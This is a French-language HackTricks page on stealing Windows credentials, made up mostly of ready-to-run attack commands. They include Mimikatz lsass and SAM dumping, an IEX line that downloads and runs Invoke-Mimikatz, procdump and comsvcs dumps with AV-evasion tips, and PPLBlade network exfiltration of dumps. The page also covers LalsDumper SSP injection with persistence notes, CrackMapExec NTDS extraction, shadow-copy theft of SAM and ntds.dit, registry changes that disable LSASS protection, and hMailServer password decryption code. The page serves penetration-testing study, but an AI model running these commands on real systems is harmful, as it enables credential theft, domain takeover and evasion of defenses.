# Vol de Credentials Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire sur** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**En savoir plus sur certaines protections possibles des credentials ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains credentials.**

## Credentials avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des passwords et des hashes** sur la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contourner l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **faire un dump du processus lsass**, **télécharger le dump** et **extraire** les **credentials localement** du dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est exécuté automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela vient du fait qu'ils **détectent** les chaînes **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **plutôt que** le **nom lsass.exe.**

### Dumping lsass with **comsvcs.dll**

Une DLL nommée **comsvcs.dll** située dans `C:\Windows\System32` est responsable du **dumping de la mémoire des processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée via `rundll32.exe`.\
Les deux premiers arguments n'ont pas d'importance, mais le troisième se compose de trois éléments. L'ID du processus à dumper constitue le premier élément, l'emplacement du fichier de dump représente le deuxième, et le troisième élément est strictement le mot **full**. Aucune autre option n'existe.\
Après avoir analysé ces trois éléments, la DLL crée le fichier de dump et y transfère la mémoire du processus spécifié.\
L'utilisation de **comsvcs.dll** permet de dumper le processus lsass sans avoir à uploader et exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Cliquez avec le bouton droit sur la Task Bar et cliquez sur Task Manager
2. Cliquez sur More details
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processes
4. Cliquez avec le bouton droit sur le processus "Local Security Authority Process" et cliquez sur "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un Protected Process Dumper Tool qui supporte l'obfuscation des memory dump et leur transfert vers des postes de travail distants sans les déposer sur le disque.

**Fonctionnalités clés**:

1. Contourner la protection PPL
2. Obfuscation des fichiers de memory dump pour échapper aux mécanismes de détection basés sur les signatures de Defender
3. Téléversement des memory dump via les méthodes RAW et SMB sans les déposer sur le disque (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon fournit un dumper en trois étapes baptisé **LalsDumper** qui n'appelle jamais `MiniDumpWriteDump`, donc les hooks EDR sur cette API ne se déclenchent jamais :

1. **Stage 1 loader (`lals.exe`)** – recherche dans `fdp.dll` un placeholder composé de 32 caractères `d` en minuscules, le remplace par le chemin absolu vers `rtu.txt`, sauvegarde la DLL patchée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, XOR chaque octet avec `0x20`, et mappe le blob décodé en mémoire avant de transférer l'exécution.
3. **Stage 3 dumper** – le payload mappé ré-implémente la logique MiniDump en utilisant **direct syscalls** résolus à partir de noms d'API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle afin que l'exfiltration puisse être réalisée ultérieurement.

Remarques pour l'opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll`, et `rtu.txt` dans le même répertoire. Stage 1 réécrit le placeholder codé en dur avec le chemin absolu vers `rtu.txt`, donc les séparer casse la chaîne.
* L'enregistrement s'effectue en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez pré-renseigner cette valeur vous-même pour forcer LSASS à recharger le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis fournissez-les à Mimikatz/Volatility pour l'extraction des identifiants.
* Lancer `lals.exe` nécessite des droits admin/SeTcb afin que `AddSecurityPackageA` réussisse ; une fois l'appel terminé, LSASS charge transparently le SSP malveillant et exécute Stage 2.
* Supprimer la DLL du disque ne l'exclut pas de LSASS. Supprimez l'entrée de registre et redémarrez LSASS (reboot) ou laissez-la pour une persistance à long terme.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extraire les secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump du NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump l'historique des mots de passe de NTDS.dit depuis le DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM_. Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### From Registry

Le moyen le plus simple de voler ces fichiers est d'obtenir une copie depuis le registry :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Cliché instantané des volumes

Vous pouvez copier des fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin n'est disponible que dans les versions de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est sauvegardé dans C:\users\Public) mais vous pouvez utiliser ceci pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Enfin, vous pouvez aussi utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour copier SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Le **NTDS.dit** est connu comme le cœur d'**Active Directory**, contenant des données cruciales sur les objets utilisateurs, les groups et leurs appartenances. C'est là que sont stockés les **password hashes** pour les utilisateurs de domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Data Table** : Cette table est chargée de stocker les détails sur des objets comme les utilisateurs et les groupes.
- **Link Table** : Elle garde la trace des relations, telles que les appartenances aux groupes.
- **SD Table** : Les **Security descriptors** pour chaque objet y sont conservés, assurant la sécurité et le contrôle d'accès des objets stockés.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Donc, **une partie** du fichier **NTDS.dit** peut se trouver **dans la mémoire de `lsass`** (vous pouvez y trouver les données récemment consultées, probablement en raison de l'amélioration des performances par l'utilisation d'un **cache**).

#### Décryptage des hashes dans NTDS.dit

Le hash est chiffré 3 fois :

1. Déchiffrer la Password Encryption Key (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Déchiffrer le **hash** en utilisant **PEK** et **RC4**.
3. Déchiffrer le **hash** en utilisant **DES**.

Le **PEK** a la **même valeur** sur **chaque domain controller**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du **fichier SYSTEM du domain controller (est différent entre domain controllers)**. C'est pourquoi, pour obtenir les **credentials** depuis le fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez aussi utiliser l'astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez aussi besoin d'une copie du **fichier SYSTEM** (à nouveau, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) astuce).

### **Extraction des hashes à partir de NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur domain admin valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit** il est recommandé de l'extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez aussi utiliser le **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits dans une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'intégralité des objets et de leurs attributs, pour permettre une extraction d'informations plus poussée lorsque le fichier NTDS.dit brut a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La ruche `SYSTEM` est optionnelle mais permet le déchiffrement des secrets (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, UAC flags, horodatage du dernier logon et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenance récursive, arbre des unités organisationnelles et appartenance, domaines de confiance avec type de trust, direction et attributs...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des credentials depuis plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des credentials de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des credentials depuis la mémoire. Téléchargez-le depuis: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Permet d'extraire des credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les credentials du SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** et les mots de passe seront extraits.

## Mining idle RDP sessions and weakening security controls

Le FinalDraft RAT d'Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (connexion réussie) and **25** (déconnexion) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dumppez LSASS (avec LalsDumper/Mimikatz) pendant que leur session **disconnected** existe encore. CredSSP + NTLM fallback laisse leur verifier et tokens dans LSASS, qui peuvent ensuite être replayed via SMB/WinRM pour récupérer `NTDS.dit` ou installer une persistence sur les domain controllers.

### Registry downgrades targeted by FinalDraft

Le même implant altère également plusieurs registry keys pour faciliter credential theft :
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Le réglage `DisableRestrictedAdmin=1` force la réutilisation complète des credential/ticket pendant RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage de tokens UAC afin que les administrateurs locaux obtiennent des tokens non restreints sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter pendant que le DC est en ligne, donnant aux attaquants un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l'accès mémoire trivial pour des dumpers tels que LalsDumper.

## Identifiants de base de données hMailServer (post-compromise)

hMailServer stocke son mot de passe DB dans `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sous `[Database] Password=`. La valeur est chiffrée Blowfish avec la clé statique `THIS_KEY_IS_NOT_SECRET` et des échanges d'endianité de mots de 4 octets. Utilisez la chaîne hexadécimale depuis l'INI avec ce snippet Python :
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrouillages de fichiers, chargez le 32-bit provider, et effectuez une mise à niveau si nécessaire avant d'interroger les hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonne `accountpassword` utilise le format de hash hMailServer (mode hashcat `1421`). Craquer ces valeurs peut fournir des identifiants réutilisables pour des pivots WinRM/SSH.
## Références

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
